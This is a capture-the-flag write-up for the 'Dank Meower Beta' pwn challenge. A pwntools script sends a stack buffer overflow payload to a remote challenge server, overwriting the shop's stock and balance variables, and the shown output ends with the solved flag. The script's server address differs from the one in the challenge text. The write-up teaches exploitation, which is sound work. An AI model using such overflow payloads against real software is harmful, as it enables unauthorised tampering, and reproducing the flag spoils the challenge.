# Dank Meower Beta

category: pwn

> I want to make a discord bot but I don't know how to use discord.py, so I made a prototype in C.

> Pst! I heard you were looking to get some flags from that flag shop over there, but they were out of stock. Luckily, I think I can help you with that... I've attached the source code of the shop [here](https://gist.github.com/azazazo/de242e67acada5e16be7c3b0745b5525), and you can download the binary [here](https://github.com/azazazo/blahajctf-files/raw/main/dank%20meower%20beta/guide). Contact me at `nc 188.166.197.31 30003` if you're still keen...

This is a simple buffer overflow challenge, with a helpful stack diagram even showing you the layout of the stack itself. The challenge already does a helpful job of explaining the basics of a buffer overflow. However, it seems that many people were stuck on how to give themselves the $2,147,483,647 (`0x7fffffff`) required to get the flag, since that requires one to input `0x7fffffff` as little-endian.

Anyways we can automate this with a pwntools script:
```py
from pwn import *
# target = process("./guide") # use this for local testing
target = remote("104.248.97.96", 30001)
for i in range(12):
    target.sendline(b'') # press enter through the buffer overflow guide

target.sendline(p64(0x1) + p32(0x1) + p32(0x1) + p32(0x1) + p32(2147483647)) # payload
target.sendline(b'2') # shop
target.recvline()
target.sendline(b'3') # buy flag
target.interactive()
```

Now let's look at this line:
```
target.sendline(p64(0x1) + p32(0x1) + p32(0x1) + p32(0x1) + p32(2147483647))
```

```
lower >---------------------------------------------stack direction----------------------------------------------> higher
  choice                                  in_stock                                                    balance
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │
└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘


Current balance: $0
1) Beg for money
2) Visit shop
3) Exit
lower >---------------------------------------------stack direction----------------------------------------------> higher
  choice                                  in_stock                                                    balance
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 01 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ ff │ ff │ ff │ 7f │
└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘


1) Beg for money
2) Visit shop
3) Exit
```
We have overwriten `choice` with the value of 1, overwritten the stock counts of all three items with 1, and overwritten the value of balance with `0x7fffffff`

We can then proceed to buy the flag:

```
lower >---------------------------------------------stack direction----------------------------------------------> higher
  choice                                  in_stock                                                    balance
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 32 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ ff │ ff │ ff │ 7f │
└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
   2


Welcome to the shop! What would you like to buy?
1) Small blahaj (in stock) - $10
2) Big blahaj (in stock) - $30
3) Flag (in stock) - $2,147,483,647
$
lower >---------------------------------------------stack direction----------------------------------------------> higher
  choice                                  in_stock                                                    balance
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 33 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ ff │ ff │ ff │ 7f │
└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
   3
lower >---------------------------------------------stack direction----------------------------------------------> higher
  choice                                  in_stock                                                    balance
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 33 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 01 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │
└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
   3

Congratulations! You now have your very own flag!
Here's your flag: blahaj{buFf3r_50Lu710n5_R35157_cH4n935_1n_pH}

Current balance: $0
1) Beg for money
2) Visit shop
3) Exit
$
```